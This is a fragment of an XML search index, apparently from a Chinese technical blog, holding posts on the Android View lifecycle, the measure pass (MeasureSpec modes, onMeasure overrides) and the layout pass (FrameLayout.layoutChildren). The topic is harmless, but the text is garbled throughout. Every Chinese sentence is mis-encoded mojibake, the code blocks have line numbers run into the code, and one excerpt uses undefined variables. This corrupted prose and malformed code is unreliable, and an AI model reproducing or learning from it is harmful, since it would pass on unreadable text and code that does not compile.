paint)ï¼šç»˜åˆ¶åœ†è§’çŸ©å½¢ drawText)(CharSequence text, int start, int end, float x, float y, Paint paint)ï¼šç»˜åˆ¶æ–‡å­— drawTextOnPath)(String text, Path path, float hOffset, float vOffset, Paint paint)ï¼šæ²¿è·¯å¾„ç»˜åˆ¶æ–‡å­— æ–¹æ³•çš„è¯¦ç»†ä¿¡æ¯åœ¨å®˜æ–¹æ–‡æ¡£ä¸­ã€‚ æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œè®¸å¤šç»˜åˆ¶æ–¹æ³•éƒ½éœ€è¦ä¸€ä¸ªPaintå‚æ•°ï¼Œ è¿™ä¸ªPaintå¯ä»¥ç†è§£ä¸ºç³»ç»Ÿä¸ºæˆ‘ä»¬æŠ½è±¡å‡ºçš„ä¸€æ”¯ç”»ç¬”ï¼Œæˆ‘ä»¬æ‰€ç»˜åˆ¶çš„å›¾å½¢éƒ½æ˜¯ç”¨è¿™æ”¯ç”»ç¬”ç»˜åˆ¶å‡ºæ¥çš„ï¼Œå½“ç„¶å› æ­¤æˆ‘ä»¬å°±å¯ä»¥å¯¹ç”»ç¬”è®¾ç½®é¢œè‰²ã€ç²—ç»†ç­‰å±žæ€§ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥ç”¨setShader()æ–¹æ³•ä¸ºè¿™ä¸ªPaintè®¾ç½®ä¸€ä¸ªShaderï¼Œæ¥å®žçŽ°å„ç§ç‰¹æ®Šçš„åŠ¨æ€æ•ˆæžœï¼ŒShaderçš„ä½¿ç”¨éœ€è¦å¦èµ·ä¸€ç¯‡åšå®¢æ¥è®²ã€‚]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Viewç»˜åˆ¶ï¼ˆä¸‰ï¼‰layoutè¿‡ç¨‹]]></title>
    <url>%2F2017%2F03%2F12%2Fandroid_view_onLayout%2F</url>
    <content type="text"><![CDATA[ç»è¿‡ä¸Šä¸€ç¯‡ä»‹ç»çš„measureè¿‡ç¨‹ä¹‹åŽï¼Œå„ä¸ªViewçš„å°ºå¯¸ä¿¡æ¯å·²ç»å­˜å‚¨åœ¨äº†æ¯ä¸ªViewä¸­ï¼Œä¸‹é¢æ˜¯layoutè¿‡ç¨‹ï¼Œlayoutè¿‡ç¨‹çš„ç›®çš„æ˜¯æ ¹æ®ä¸Šä¸€æ­¥ä¸­è®¡ç®—å‡ºçš„å°ºå¯¸æ¥æ­£ç¡®è®¾ç½®å„ä¸ªViewåŠå…¶åŽä»£çš„ä½ç½®ã€‚è¿™ä¸ªè¿‡ç¨‹é¦–å…ˆè¢«è°ƒç”¨çš„æ˜¯Viewçš„layout()æ–¹æ³•ï¼Œlayout()çš„æ–¹æ³•ç­¾åæ˜¯public void layout(int l, int t, int r, int b)ï¼Œå››ä¸ªå‚æ•°åˆ†åˆ«ä¸ºå·¦è¾¹ç•Œè·çˆ¶Viewå·¦è¾¹ç•Œçš„è·ç¦»ï¼Œä¸Šè¾¹ç•Œè·çˆ¶Viewä¸Šè¾¹ç•Œçš„è·ç¦»ï¼Œå³è¾¹ç•Œè·çˆ¶Viewå·¦è¾¹ç•Œçš„è·ç¦»ï¼Œä¸‹è¾¹ç•Œè·çˆ¶Viewä¸Šè¾¹ç•Œçš„è·ç¦»ã€‚ 12boolean changed = isLayoutModeOptical(mParent) ? setOpticalFrame(l, t, r, b) : setFrame(l, t, r, b); changedæ˜¯ç”¨äºŽä¼ é€’ç»™onLayout()æ–¹æ³•çš„å‚æ•°ï¼Œå®ƒæŒ‡ç¤ºäº†å¸ƒå±€æ˜¯å¦è¢«æ”¹å˜ã€‚ åŽé¢çš„è¡¨è¾¾å¼æŸ¥çœ‹äº†çˆ¶Viewçš„å¸ƒå±€æ¨¡å¼æ˜¯å¦éœ€è¦æ˜¾ç¤ºè¾¹æ¡†ï¼Œå¦‚éœ€è¦ï¼Œè°ƒç”¨çš„æ˜¯setOpticalFrame()æ–¹æ³•ï¼š 12345678910private boolean setOpticalFrame(int left, int top, int right, int bottom) &#123; Insets parentInsets = mParent instanceof View ? ((View) mParent).getOpticalInsets() : Insets.NONE; Insets childInsets = getOpticalInsets(); return setFrame( left + parentInsets.left - childInsets.left, top + parentInsets.top - childInsets.top, right + parentInsets.left + childInsets.right, bottom + parentInsets.top + childInsets.bottom);&#125; å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•è¯»å–äº†è®¾ç½®çš„è¾¹æ¡†å€¼ï¼Œ æŠŠåŽŸå€¼åŠ ä¸Šè¾¹æ¡†å€¼åŽè¿˜æ˜¯è°ƒç”¨äº†setFrame()æ–¹æ³•ã€‚ setFrame()æ–¹æ³•é€šè¿‡ä¼ å…¥çš„å‚æ•°ç¡®å®šäº†è¯¥Viewæœ€ç»ˆçš„ä½ç½®ä»¥åŠå°ºå¯¸ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œä¸€ä¸ªViewæœ€ç»ˆæ˜¾ç¤ºåœ¨ä»€ä¹ˆä½ç½®ä»¥åŠå®ƒçš„å°ºå¯¸æ˜¯ç”±layout()æ–¹æ³•å†³å®šçš„ï¼ŒonMeasure()æ–¹æ³•åªæ˜¯å°†æµ‹é‡å‡ºçš„ViewæœŸæœ›å…·æœ‰çš„å¤§å°å‚¨å­˜åœ¨Viewä¸­ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šæ ¹æ®å‚¨å­˜çš„è¿™ä¸ªå°ºå¯¸æ¥ä½œä¸ºè®¾å®šçš„ä¾æ®ã€‚ æŽ¥ä¸‹æ¥layout()æ–¹æ³•ä¼šè°ƒç”¨onLayout()æ–¹æ³•ï¼Œï¼ˆå¦‚æžœéœ€è¦çš„è¯ï¼‰æˆ‘ä»¬éœ€è¦é‡å†™è¿™ä¸ªæ–¹æ³•æ¥è°ƒç”¨å­Viewçš„layout()æ–¹æ³•ã€‚æ‰€ä»¥å†³å®šå­Viewå¦‚ä½•æ˜¾ç¤ºçš„å…³é”®æ­¥éª¤å°±åœ¨è¿™é‡Œï¼Œä»–ä»¬çš„ä½ç½®å’Œå°ºå¯¸å®Œå…¨å–å†³äºŽè¿™é‡Œè°ƒç”¨å®ƒä»¬çš„layout()æ–¹æ³•æ—¶ä¼ å…¥çš„å‚æ•°ã€‚å½“ç„¶ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä¼šæ ¹æ®å­Viewä¸­çš„æµ‹é‡ç»“æžœæ¥è®¾ç½®è¿™ä¸ªå€¼ã€‚è¿™é‡Œæ‹¿FrameLayoutè¿™ä¸ªéœ€è¦å¤„ç†å­Viewçš„ViewGroupå®žä¾‹æ¥ä¸¾ä¾‹ï¼š 1234@Overrideprotected void onLayout(boolean changed, int left, int top, int right, int bottom) &#123; layoutChildren(left, top, right, bottom, false /* no force left gravity */);&#125; ç›´æŽ¥è°ƒç”¨äº†layoutChildren()ï¼šï¼ˆçœç•¥éƒ¨åˆ†è¡Œï¼‰ 123456789101112131415161718192021222324252627282930313233343536void layoutChildren(int left, int top, int right, int bottom, boolean forceLeftGravity) &#123; final int count = getChildCount(); final int parentLeft = getPaddingLeftWithForeground(); final int parentRight = right - left - getPaddingRightWithForeground(); final int parentTop = getPaddingTopWithForeground(); final int parentBottom = bottom - top - getPaddingBottomWithForeground(); for (int i = 0; i &lt; count; i++) &#123; final View child = getChildAt(i); final int width = child.getMeasuredWidth(); final int height = child.getMeasuredHeight(); int childLeft; int childTop; switch (verticalGravity) &#123; case Gravity.TOP: childTop = parentTop + lp.topMargin; break; case Gravity.CENTER_VERTICAL: childTop = parentTop + (parentBottom - parentTop - height) / 2 + lp.topMargin - lp.bottomMargin; break; case Gravity.BOTTOM: childTop = parentBottom - height - lp.bottomMargin; break; default: childTop = parentTop + lp.topMargin; &#125; child.layout(childLeft, childTop, childLeft + width, childTop + height); &#125; &#125;&#125; çœç•¥äº†ä¸ŽèŽ·å–å¸ƒå±€å±žæ€§ç›¸å…³çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ï¼š 4-8è¡ŒèŽ·å–äº†çˆ¶Viewçš„ä½ç½®æ•°æ®å¹¶åœ¨18-31è¡Œç”¨äºŽç¡®å®šæœ€ç»ˆçš„ä½ç½®æ•°æ® 10-11è¡ŒéåŽ†äº†æ‰€æœ‰çš„å­View 12-13è¡ŒèŽ·å–äº†å­Viewä¸­åœ¨ä¸Šä¸€æ­¥éª¤çš„æµ‹é‡è¿‡ç¨‹ä¸­å‚¨å­˜çš„å®½å’Œé«˜ï¼Œå¹¶ç”¨äºŽç¬¬33è¡Œä¸­è®¾ç½®æœ€ç»ˆçš„å³è¾¹ç•Œä¸Žä¸‹è¾¹ç•Œ ç¬¬33è¡Œè°ƒç”¨å­Viewçš„layout()æ–¹æ³•]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Viewç»˜åˆ¶ï¼ˆäºŒï¼‰measureè¿‡ç¨‹]]></title>
    <url>%2F2017%2F03%2F10%2Fandroid_view_onMeasure%2F</url>
    <content type="text"><![CDATA[ä¸Šä¸€ç¯‡åšå®¢ç®€å•åœ°ä»‹ç»äº†Viewç»˜åˆ¶çš„ç”Ÿå‘½å‘¨æœŸï¼Œ ä»Žè¿™ç¯‡åšå®¢å¼€å§‹å°†ä¼šå¯¹è¿™ä¸ªå‘¨æœŸä¸­ä¸€äº›æœ‰ç”¨çš„è¿‡ç¨‹è¿›è¡Œä¸€ä¸ªè¯¦ç»†ä¸€äº›çš„ä»‹ç»ã€‚è¿™ç¯‡çš„ä¸»è§’å°±æ˜¯åœ¨æž„é€ æ–¹æ³•ä¹‹åŽè°ƒç”¨çš„measureè¿‡ç¨‹ã€‚ ä¸ºäº†æ¼”ç¤ºï¼Œç»§æ‰¿äº†TextViewæ¥å®žçŽ°ä¸€ä¸ªè‡ªå®šä¹‰çš„Viewã€‚æ³¨æ„è¿™é‡Œç»§æ‰¿çš„åº”è¯¥æ˜¯android.support.v7.widget.AppCompatTextViewè¿™ä¸ªç±»ã€‚åŒæ—¶ä¸ºäº†xmlæ–‡ä»¶çš„æ­£å¸¸è§£æžï¼Œæˆ‘ä»¬éœ€è¦å®žçŽ°Viewçš„ä¸‰ä¸ªæž„é€ æ–¹æ³•ã€‚ 1234567891011public VView(Context context) &#123; super(context);&#125;public VView(Context context, AttributeSet attrs) &#123; super(context, attrs);&#125;public VView(Context context, AttributeSet attrs, int defStyleAttr) &#123; super(context, attrs, defStyleAttr);&#125; å†é€šè¿‡å®Œæ•´åŒ…åçš„æ–¹æ³•åœ¨xmlå¸ƒå±€æ–‡ä»¶ä¸­åˆ›å»ºæˆ‘ä»¬çš„Viewå°±å¯ä»¥ç›´æŽ¥æ˜¾ç¤ºäº†ã€‚ 12345&lt;com.viseator.viewtest.VView android:layout_width="100dp" android:layout_height="100dp" android:background="@color/Gray" /&gt; è¿™é‡Œç»™äº†TextViewä¸€ä¸ªèƒŒæ™¯é¢œè‰²ä¾¿äºŽåŽé¢çš„è§‚å¯Ÿã€‚ ä¸‹é¢å°±å¼€å§‹åˆ†æžmeasureè¿‡ç¨‹ã€‚ measureæ˜¯ä¸€ä¸ªè‡ªé¡¶å‘ä¸‹çš„è¿‡ç¨‹ï¼Œå³çˆ¶Viewä¼šä¾æ¬¡è°ƒç”¨å®ƒçš„å­Viewçš„measure()æ–¹æ³•æ¥å¯¹å®ƒçš„å­Viewè¿›è¡Œæµ‹é‡ã€‚ Viewçš„measure()æ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨onMeasure()ï¼ŒçœŸæ­£çš„å°ºå¯¸ä¿¡æ¯å°±æ˜¯åœ¨onMeasure()æ–¹æ³•ä¸­æœ€ç»ˆç¡®å®šçš„ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯åœ¨è‡ªå®šä¹‰Viewä¸­é‡å†™onMeasure()æ–¹æ³•ã€‚ é‚£ä¹ˆå­Viewæ ¹æ®ä»€ä¹ˆæ¥ç¡®å®šè‡ªå·±åº”è¯¥å…·æœ‰çš„å°ºå¯¸å‘¢ï¼Ÿå½“ç„¶ä¸å¯èƒ½è®©å­Viewè‡ªç”±åœ°å†³å®šè‡ªå·±çš„å¤§å°ï¼Œçˆ¶Viewå¿…ç„¶éœ€è¦å‘å­Viewä¼ é€’ä¿¡æ¯æ¥å¸®åŠ©å­Viewæ¥ç¡®å®šå°ºå¯¸ï¼Œè€Œå­Viewåˆ™å¿…é¡»æ»¡è¶³çˆ¶Viewçš„è¦æ±‚ã€‚æŸ¥çœ‹measure()çš„æ–¹æ³•ç­¾åï¼š 1public final void measure(int widthMeasureSpec, int heightMeasureSpec) è¿™é‡Œçš„widthMeasureSpecä¸ŽheightMeasureSpecå°±æ˜¯å­˜å‚¨è¿™ä¸€ä¿¡æ¯çš„å‚æ•°ã€‚å®ƒä»¬çš„ç±»åž‹æ˜¯intï¼Œå†…éƒ¨ä»¥é«˜ä¸¤ä½æ¥å­˜å‚¨æµ‹é‡çš„æ¨¡å¼ï¼Œä½Žä¸‰åä½ä¸ºæµ‹é‡çš„å¤§å°ï¼Œè®¡ç®—ä¸­ä½¿ç”¨äº†ä½è¿ç®—æ¥æé«˜å¹¶ä¼˜åŒ–æ•ˆçŽ‡ã€‚å½“ç„¶æˆ‘ä»¬ä¸å¿…ä½¿ç”¨ä½è¿ç®—æ¥èŽ·å¾—å¯¹åº”çš„æ•°å€¼ï¼ŒView.MeasureSpecä¸ºæˆ‘ä»¬æä¾›äº†å¯¹åº”çš„æ–¹æ³•ã€‚ æµ‹é‡æ¨¡å¼æœ‰ä¸‰ç§ï¼š EXACTLYï¼šç²¾ç¡®å€¼æ¨¡å¼ï¼Œå³å­Viewå¿…é¡»ä½¿ç”¨è¿™ä¸€å°ºå¯¸ï¼Œå¹¶ä¸”ä¿è¯å®ƒä»¬çš„æ‰€æœ‰åŽä»£éƒ½åœ¨è¿™ä¸ªèŒƒå›´ä¹‹å†…ã€‚å½“æˆ‘ä»¬å°†æŽ§ä»¶çš„layout_widthã€layout_heightå±žæ€§æŒ‡å®šä¸ºå…·ä½“æ•°å€¼æˆ–match_parentæ—¶ï¼Œç³»ç»Ÿä½¿ç”¨è¿™ä¸€æ¨¡å¼ã€‚ UNSPECIFIEDï¼šæ— é™åˆ¶æ¨¡å¼ï¼Œä¸å¯¹å­Viewæ–½åŠ ä»»ä½•é™åˆ¶ï¼Œå®Œå…¨ç”±å­Viewå†³å®šè‡ªå·±çš„å¤§å°ã€‚å¯ä»¥ç”¨äºŽæŸ¥çœ‹å­Viewæƒ³è¦çš„å°ºå¯¸ï¼Œæ¯”å¦‚å¯ä»¥æŠŠå­Viewçš„é•¿åº¦ä½¿ç”¨EXACTLYæ¨¡å¼é™åˆ¶åœ¨100ï¼Œä¸é™åˆ¶å®½åº¦æ¥æŸ¥çœ‹å­Viewåœ¨é•¿åº¦ä¸º100æƒ…å†µæƒ³è¦çš„å®½åº¦ã€‚ AT_MOSTï¼šæœ€å¤§å€¼æ¨¡å¼ï¼Œåªé™åˆ¶å­Viewèƒ½å…·æœ‰çš„æœ€å¤§å°ºå¯¸ï¼Œå­Viewå¿…é¡»ä¿è¯å®ƒå’Œå®ƒçš„åŽä»£ä»¬éƒ½åœ¨è¿™ä¸€èŒƒå›´ä¹‹å†…ã€‚ äº†è§£è¿™äº›ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡é‡å†™onMeasure()æ¥ç¡®å®šä¸€ä¸ªViewçš„å°ºå¯¸ã€‚ ä½†åœ¨é‡å†™æ–¹æ³•æ—¶è¦æ³¨æ„ï¼šå¿…é¡»è°ƒç”¨setMeasuredDimension() æ¥å°†æœ€ç»ˆå°ºå¯¸å­˜å‚¨åœ¨Viewä¸­ï¼Œå¦åˆ™ä¼šæŠ›å‡ºä¸€ä¸ªIllegalStateExceptionã€‚ xml: 12345&lt;com.viseator.viewtest.VView android:layout_width="wrap_content" android:layout_height="100dp" android:background="@color/Gray" /&gt; VView: 1234567891011@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; int widthMode = MeasureSpec.getMode(widthMeasureSpec); int heightMode = MeasureSpec.getMode(heightMeasureSpec); int width = MeasureSpec.getSize(widthMeasureSpec); int height = MeasureSpec.getSize(heightMeasureSpec); Log.d(TAG, "widthMode: " + widthMode); Log.d(TAG, "heightMode: " + heightMode); Log.d(TAG, "width :" + width); Log.d(TAG, "height :" + height); super.onMeasure(widthMeasureSpec, heightMeasureSpec); log: è¿™æ®µç®€å•çš„ä»£ç éªŒè¯äº†ä¹‹å‰çš„è¯´æ³•ï¼Œåˆ†åˆ«å¯¹å®½é«˜è®¾ç½®äº†wrap_contentå’Œå›ºå®šå€¼ï¼Œå¯ä»¥å‘çŽ°æ¨¡å¼åˆ†åˆ«ä¸ºAT_MOSTä¸ŽEXACTLYï¼ˆä»¥æ•°å€¼è¡¨ç¤ºï¼‰ã€‚ è¿™é‡Œè¾“å‡ºçš„å®½é«˜å€¼æ˜¯ä»¥åƒç´ ä¸ºå•ä½çš„ï¼Œå¯ä»¥çœ‹åˆ°é«˜åº¦çš„æœŸæœ›å€¼å°±æ˜¯è®¾ç½®çš„å¤§å°ï¼Œä½†wrap_contentæœŸæœ›çš„å®½åº¦å€¼ä¸º1080ï¼ˆå±å¹•å®½åº¦ï¼‰ï¼Œé»˜è®¤å³ä¸ºå±å¹•å®½åº¦ï¼Œä½†æœ€ç»ˆè®¡ç®—å¾—å‡ºçš„å®½åº¦å€¼ç”±äºŽé‡Œé¢æ²¡æœ‰æ–‡å­—æ‰€ä»¥ä¸º0ã€‚ åŒæ ·åœ°ï¼ŒUNSPECIFIEDæ¨¡å¼ç»™å‡ºçš„é»˜è®¤å°ºå¯¸ä¹Ÿæ˜¯å±å¹•çš„å®½/é«˜ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æžœæƒ³è¦å®žçŽ°wrap_contentçš„æ•ˆæžœï¼Œæˆ‘ä»¬å¿…é¡»åœ¨onMeasureä¸­å¯¹AT_MOSTæ¨¡å¼è®¡ç®—å…¶å†…å®¹å®½/é«˜å¹¶ä½œä¸ºæœ€ç»ˆçš„å®½/é«˜ï¼Œå¦åˆ™å°†ä»¥å±å¹•çš„å®½/é«˜è¿›è¡Œå¡«å……ã€‚ä»¥LinearLayoutçš„æºç ä¸ºä¾‹ï¼š 1234567891011121314151617181920212223242526272829if (useLargestChild &amp;&amp; (heightMode == MeasureSpec.AT_MOST || heightMode == MeasureSpec.UNSPECIFIED)) &#123; mTotalLength = 0; for (int i = 0; i &lt; count; ++i) &#123; final View child = getVirtualChildAt(i); if (child == null) &#123; mTotalLength += measureNullChild(i); continue; &#125; if (child.getVisibility() == GONE) &#123; i += getChildrenSkipCount(child, i); continue; &#125; final LinearLayout.LayoutParams lp = (LinearLayout.LayoutParams) child.getLayoutParams(); // Account for negative margins final int totalLength = mTotalLength; mTotalLength = Math.max(totalLength, totalLength + largestChildHeight + lp.topMargin + lp.bottomMargin + getNextLocationOffset(child)); &#125;&#125;// Add in our paddingmTotalLength += mPaddingTop + mPaddingBottom;int heightSize = mTotalLength; è¿™éƒ¨åˆ†ä»£ç å‘æˆ‘ä»¬å±•ç¤ºäº†LinearLayoutå¤„ç†å­Viewå¹¶è®¡ç®—æ‰€æœ‰çš„é«˜åº¦çš„æƒ…å†µã€‚ çŸ¥é“äº†è¿™ä¸ªè°ƒç”¨è¿‡ç¨‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥çœŸæ­£åœ°è¿›è¡ŒonMeasure()çš„é‡å†™äº†ã€‚ ä¾‹å¦‚å¯ä»¥æš´åŠ›æŒ‡å®šViewå°ºå¯¸ï¼š 1234@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; setMeasuredDimension(100,600);&#125; å¯ä»¥ä¸ºAT_MOSTä¸ŽUNSPECIFIEDæ¨¡å¼æŒ‡å®šä¸€ä¸ªé»˜è®¤å¤§å°ï¼š 123456789101112131415@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; setMeasuredDimension(measureSize(widthMeasureSpec), measureSize(heightMeasureSpec));&#125;int measureSize(int measureSpec) &#123; int mode = MeasureSpec.getMode(measureSpec); int size = MeasureSpec.getSize(measureSpec); if (mode == MeasureSpec.EXACTLY) &#123; return size; &#125; else &#123; size = 300; //Default size return Math.min(size,MeasureSpec.getSize(measureSpec)); &#125;&#125; è‡³äºŽæ›´å¤æ‚çš„è®¡ç®—é€»è¾‘ç”±äºŽæœ¬äººèƒ½åŠ›æœ‰é™å°±ä¸å†™demoäº†ï¼Œå¦‚æžœä»¥åŽå®žé™…ä¸­é‡åˆ°éœ€è¦çš„æ—¶å€™å†ä½œè¡¥å……ã€‚]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Viewç»˜åˆ¶ï¼ˆä¸€ï¼‰ç”Ÿå‘½å‘¨æœŸæ€»è§ˆ]]></title>
    <url>%2F2017%2F03%2F09%2Fandroid_view_lifeCycle%2F</url>
    <content type="text"><![CDATA[ä¸ºäº†ç›´è§‚è¡¨ç¤ºæ•´ä¸ªè¿‡ç¨‹ï¼Œæˆ‘åˆ¶ä½œäº†ä¸€å¼ æµç¨‹å›¾ã€‚æ³¨æ„ä»¥ä¸‹åªæ˜¯æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­æ¯”è¾ƒå¸¸ç”¨çš„æ–¹æ³•ï¼Œå¹¶ä¸ä»£è¡¨æ‰€æœ‰çš„è¿‡ç¨‹ã€‚ å½“ä¸€ä¸ªActivityæ”¶åˆ°ç„¦ç‚¹å³å°†è¦å¤„äºŽæ¿€æ´»çŠ¶æ€æ—¶ï¼Œå°†ä¼šè¢«è¦æ±‚ç»˜åˆ¶å®ƒçš„å¸ƒå±€ï¼Œç»˜åˆ¶å¸ƒå±€ä¹‹å‰çš„è¿‡ç¨‹åœ¨è¿™é‡Œä¸æ¶‰åŠï¼Œæˆ‘ä»¬ä»Žç»˜åˆ¶Viewå¼€å§‹åˆ†æžã€‚ æ¯ä¸ªActivityè¢«è¦æ±‚æä¾›ä¸€ä¸ªViewGroupä½œä¸ºViewæ ‘çš„æ ¹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„setContentViewæ–¹æ³•ã€‚ 1234567891011121314@Overridepublic void setContentView(@LayoutRes int layoutResID) &#123; getDelegate().setContentView(layoutResID);&#125;@Overridepublic void setContentView(View view) &#123; getDelegate().setContentView(view);&#125;@Overridepublic void setContentView(View view, ViewGroup.LayoutParams params) &#123; getDelegate().setContentView(view, params);&#125; å¯ä»¥çœ‹åˆ°setContentViewæ‹¥æœ‰ä¸‰ç§å½¢å¼ï¼Œå¯ä»¥ç›´æŽ¥ä¼ å…¥Viewã€ä¼ å…¥ä¸€ä¸ªlayoutèµ„æºæ–‡ä»¶ï¼Œæˆ–ä¼ å…¥ä¸€ä¸ªViewæ–‡ä»¶å’Œä¸€ä¸ªç”¨äºŽæä¾›å‚æ•°çš„LayoutParamså¯¹è±¡ã€‚ æ•´ä¸ªè¿‡ç¨‹å°†ä»Žè¿™ä¸ªæ ¹Viewå¼€å§‹ï¼Œå¹¶éåŽ†å®ƒçš„å­Viewæ¥é€ä¸€ç»˜åˆ¶ï¼Œæ¯ä¸ªViewGroupæ‰¿æ‹…äº†è¦æ±‚å®ƒçš„å­Viewè¿›è¡Œç»˜åˆ¶çš„è´£ä»»ï¼Œæ¯ä¸ªViewæ‰¿æ‹…äº†ç»˜åˆ¶è‡ªèº«çš„è´£ä»»ã€‚å¹¶ä¸”çˆ¶Viewä¼šåœ¨å­Viewå®Œæˆç»˜åˆ¶ä¹‹å‰è¿›è¡Œç»˜åˆ¶ï¼ŒåŒçº§çš„Viewå°†ä»¥å®ƒä»¬å‡ºçŽ°åœ¨æ ‘ä¸­çš„é¡ºåºè¿›è¡Œç»˜åˆ¶ã€‚ é¦–å…ˆè°ƒç”¨çš„å½“ç„¶æ˜¯Viewçš„æž„é€ å‡½æ•°ï¼Œæž„é€ å‡½æ•°åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§ä¾›ä»£ç åˆ›å»ºçš„Viewä½¿ç”¨ï¼Œå¦ä¸€ç§æ˜¯ç”±layoutæ–‡ä»¶ç”Ÿæˆçš„Viewä½¿ç”¨ï¼ŒåŒºåˆ«åœ¨äºŽåŽè€…ä¼šä»Žlayoutæ–‡ä»¶ä¸­è¯»å…¥æ‰€æœ‰çš„å±žæ€§ï¼Œå‰è€…çš„å±žæ€§åˆ™éœ€è¦åœ¨ä»£ç ä¸­è®¾ç½®ã€‚ å¦å¤–åŽè€…åœ¨æ‰€æœ‰çš„å­Viewéƒ½ç”Ÿæˆå®Œæ¯•ä¹‹åŽä¼šå›žè°ƒonFinishInflateæ–¹æ³•ã€‚ åœ¨æ­£å¼ç»˜åˆ¶ä¹‹å‰è¦è¿›è¡Œä¸¤ä¸ªè¿‡ç¨‹ï¼ˆå¸ƒå±€æœºåˆ¶[layout mechanism]ï¼‰ï¼š é¦–å…ˆæ˜¯measureè¿‡ç¨‹ã€‚è¿™æ˜¯ä¸€ä¸ªè‡ªé¡¶å‘ä¸‹çš„è¿‡ç¨‹ï¼Œçˆ¶Viewå°†æœŸæœ›å°ºå¯¸ä¼ é€’ç»™å­Viewï¼Œå­Viewéœ€è¦æ ¹æ®è¿™ä¸€ä¿¡æ¯ç¡®å®šè‡ªå·±çš„å°ºå¯¸ï¼Œå¹¶ä¸”ä¿è¯è¿™ä¸€å°ºå¯¸æ»¡è¶³çˆ¶Viewå¯¹å…¶çš„è¦æ±‚ï¼Œåœ¨å­Viewç¡®å®šè‡ªå·±å°ºå¯¸çš„è¿‡ç¨‹ä¸­ä¹Ÿè¦å‘å®ƒçš„å­Viewä¼ é€’ä¿¡æ¯ï¼Œå°±è¿™æ ·é€’å½’åœ°ç¡®å®šè‡ªå·±çš„å°ºå¯¸ä¿¡æ¯å¹¶å‚¨å­˜åœ¨è‡ªèº«ä¸­ï¼Œä¿è¯åœ¨measureæ–¹æ³•è¿”å›žæ—¶ï¼Œè‡ªèº«çš„å°ºå¯¸ä¿¡æ¯å·²ç»ç¡®å®šã€‚æ‰€ä»¥åœ¨æ ¹Viewçš„measureæ–¹æ³•è¿”å›žæ—¶ï¼Œæ‰€æœ‰å­Viewçš„å°ºå¯¸ä¿¡æ¯å·²ç»å…¨éƒ¨ç¡®å®šäº†ã€‚ è¿™ä¸ªè¿‡ç¨‹éœ€è¦æ³¨æ„ä¸€ä¸ªViewå¯èƒ½ä¸æ­¢ä¸€æ¬¡åœ°è°ƒç”¨measureæ–¹æ³•æ¥å¯¹å­Viewè¿›è¡Œæµ‹é‡ã€‚æ¯”å¦‚ï¼Œå¯èƒ½è¦å…ˆä¼ é€’ä¸€ä¸ªæ— é™åˆ¶çš„ä¿¡æ¯æ¥èŽ·å–å­Viewæƒ³è¦çš„å°ºå¯¸ï¼Œå½“å­Viewå¸Œæœ›çš„å°ºå¯¸è¿‡å¤§æˆ–è¿‡å°æ—¶ï¼Œçˆ¶Viewéœ€è¦å†æ¬¡è°ƒç”¨measureæ–¹æ³•æ¥ç»™äºˆå­Viewä¸€äº›é™åˆ¶ã€‚ ç¬¬äºŒä¸ªæ˜¯layoutè¿‡ç¨‹ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªè‡ªé¡¶å‘ä¸‹çš„éåŽ†è¿‡ç¨‹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­çˆ¶Viewè´Ÿè´£æŒ‰ç…§ä¸Šä¸€ä¸ªè¿‡ç¨‹ä¸­è®¡ç®—å¹¶å‚¨å­˜åœ¨Viewä¸­çš„å°ºå¯¸ä¿¡æ¯æ¥æ­£ç¡®åœ°æ”¾ç½®å­Viewã€‚ åŒæ—¶è¿™ä¸ªè¿‡ç¨‹å¯ä»¥é€šè¿‡è°ƒç”¨requestLayout()æ¥é‡æ–°è¿›è¡Œï¼Œå¹¶ä¸”ä¼šå¼•èµ·åŽé¢æ­¥éª¤çš„æ‰§è¡Œï¼Œç›¸å½“äºŽå¯¹ä»¥è¿™ä¸ªViewä¸ºæ ¹çš„Viewæ ‘è¿›è¡Œé‡æ–°å¸ƒå±€ã€‚ ä¸‹é¢å°±æ˜¯çœŸæ­£çš„ç»˜åˆ¶è¿‡ç¨‹äº†ï¼Œä¹Ÿå°±æ˜¯Viewçš„draw()æ–¹æ³•ï¼Œåœ¨draw()æ–¹æ³•ä¸­ï¼Œï¼ˆå¦‚æžœéœ€è¦ï¼‰ä¼šä¾æ¬¡è°ƒç”¨å¦‚ä¸‹æ–¹æ³•ï¼š drawBackground()ï¼šåœ¨ç”»å¸ƒä¸Šç»˜åˆ¶ç‰¹å®šçš„èƒŒæ™¯ onDraw()ï¼šé‡å†™Viewå‡ ä¹Žå¿…é‡å†™çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºŽç»˜åˆ¶å›¾å½¢ 